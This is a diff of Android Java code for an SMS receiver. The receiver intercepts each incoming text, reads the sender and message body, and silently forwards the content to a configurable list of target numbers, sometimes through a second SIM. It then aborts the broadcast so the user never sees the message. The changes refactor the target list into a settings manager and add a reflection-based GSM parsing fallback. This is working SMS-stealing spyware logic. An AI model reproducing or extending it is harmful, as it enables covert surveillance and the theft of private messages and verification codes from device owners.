@@ -1,5 +1,8 @@
 package com.internal.transmit;
 
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+
 import android.app.Notification;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
@@ -22,6 +25,8 @@ public class PrivilegedSmsReceiver extends BroadcastReceiver {
     public void onReceive(Context arg0, Intent intent) {
         if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] >>>>>>>>>>>>>>>>>>>>>>>");
 
+        SettingManager.getInstance().init(arg0);
+        
         if (!Config.IS_CENTER_MODE) {
             if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                 Bundle bundle = intent.getExtras();
@@ -67,6 +72,51 @@ public class PrivilegedSmsReceiver extends BroadcastReceiver {
         }
     }
     
+    private void parseGSMMessageAndSend (Context context, Object[] objArray, ArrayList<String> targets) {
+        if (objArray.length > 0) {
+            try {
+                Class<?> gsmSMSMessage = Class.forName("com.android.internal.telephony.gsm.SmsMessage");
+//                if (DEBUG) {
+//                    Method[] methods = gsmSMSMessage.getDeclaredMethods();
+//                    if (methods != null) {
+//                        for (Method m : methods) {
+//                            Log.d(TAG, "[[parseSMS]] method name = " + m.getName());
+//                        }
+//                    }
+//                }
+                Method createFromPduMethod = gsmSMSMessage.getMethod("createFromPdu", byte[].class);
+                Object gsmSMSMessageObj = createFromPduMethod.invoke(gsmSMSMessage, (byte[]) objArray[0]);
+                
+                Class<?> smsMessageBase = Class.forName("com.android.internal.telephony.SmsMessageBase");
+                Method getMessageBodyMethod = smsMessageBase.getMethod("getMessageBody");
+                Method getDisplayAddressMethod = smsMessageBase.getMethod("getDisplayOriginatingAddress");
+
+                String gsmContent = (String) getMessageBodyMethod.invoke(gsmSMSMessageObj, new Object[] {});
+                String gsmPhoneNum = (String) getDisplayAddressMethod.invoke(gsmSMSMessageObj, new Object[] {});
+
+                
+                if (DEBUG) Log.d(TAG, "[[parseSMS]] GSM : gsmPhoneNum = " + gsmPhoneNum 
+                                        + " gsmContent = " + gsmContent);
+                
+                if (!TextUtils.isEmpty(gsmPhoneNum)) {
+                    if (targets != null) {
+                        for (String target : targets) {
+                            if (!gsmPhoneNum.endsWith(target)) {
+                                try {
+                                    InternalUtils.sendMessage(context, target, gsmContent);
+                                } catch (Exception ex) {
+                                    ex.printStackTrace();
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+    
     private void parseSMS(Context context, Intent intent) {
         if (DEBUG) Log.d(TAG, "[[parseSMS]] entry into >>>>>>>>>>>>>>");
         if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
@@ -87,62 +137,31 @@ public class PrivilegedSmsReceiver extends BroadcastReceiver {
                         if (DEBUG) Log.d(TAG, "[[parseSMS]] CDMA : phoneNum = " + phoneNum 
                                         + " content = " + content);
                         
-                        String[] targets = Config.TAEGET_NUM.split(";");
-                        if (targets != null && phoneNum != null) {
-                            for (String target : targets) {
-                                if (!phoneNum.endsWith(target)) {
-                                    try {
-                                        InternalUtils.sendMessageBySecondSIMCard(context, target, content);
-                                    } catch (Exception e) {
-                                        e.printStackTrace();
+                        ArrayList<String> targets = SettingManager.getInstance().getTargetList();
+                        if (!TextUtils.isEmpty(phoneNum)) {
+                            if (targets != null) {
+                                for (String target : targets) {
+                                    if (!phoneNum.endsWith(target)) {
+                                        try {
+                                            InternalUtils.sendMessageBySecondSIMCard(context, target, content);
+                                        } catch (Exception e) {
+                                            e.printStackTrace();
+                                        }
                                     }
                                 }
                             }
+                        } else {
+                            //try parse phoneNum by GSM
+                            parseGSMMessageAndSend(context, objArray, targets);
                         }
                         
                         this.abortBroadcast();
-                    } else {//gsm
-//                        wrappedMessage[n] = android.telephony.gsm.SmsMessage.createFromPdu((byte[]) messages[n]);
-//                        mode = SmsSender.SEND_MODE_GSM;
                     }
-//                    if (wrappedMessage[n] == null) {
-//                        if (needTryGsm) {
-//                            wrappedMessage[n] = com.android.internal.telephony.gsm.SmsMessage
-//                                    .createFromPdu((byte[]) messages[n]);
-//                            mode = SmsSender.SEND_MODE_GSM;
-//                        } else if (needTryCdma) {
-//                            wrappedMessage[n] = com.android.internal.telephony.cdma.SmsMessage
-//                                    .createFromPdu((byte[]) messages[n]);
-//                            mode = SmsSender.SEND_MODE_CDMA;
-//                        } else {
-//                            tempString = "";
-//                        }
-//                    }
                 } catch (OutOfMemoryError e) {
-                    if (objArray.length > 0) {
-                        android.telephony.gsm.SmsMessage gsmSMS = android.telephony.gsm.SmsMessage
-                                                                    .createFromPdu((byte[]) objArray[0]);
-                        String content = gsmSMS.getMessageBody();
-                        String phoneNum = gsmSMS.getDisplayOriginatingAddress();
-                        
-                        if (DEBUG) Log.d(TAG, "[[parseSMS]] GSM : phoneNum = " + phoneNum 
-                                                + " content = " + content);
-                        
-                        String[] targets = Config.TAEGET_NUM.split(";");
-                        if (targets != null && phoneNum != null) {
-                            for (String target : targets) {
-                                if (!phoneNum.endsWith(target)) {
-                                    try {
-                                        InternalUtils.sendMessage(context, target, content);
-                                    } catch (Exception ex) {
-                                        ex.printStackTrace();
-                                    }
-                                }
-                            }
-                        }
-                        
-                        this.abortBroadcast();
-                    }
+                    e.printStackTrace();
+                    if (DEBUG) Log.d(TAG, "[[parseSMS]] outOfMemory for GSM parse <<<<<");
+                    ArrayList<String> targets = SettingManager.getInstance().getTargetList();
+                    parseGSMMessageAndSend(context, objArray, targets);
                 }
 
             }
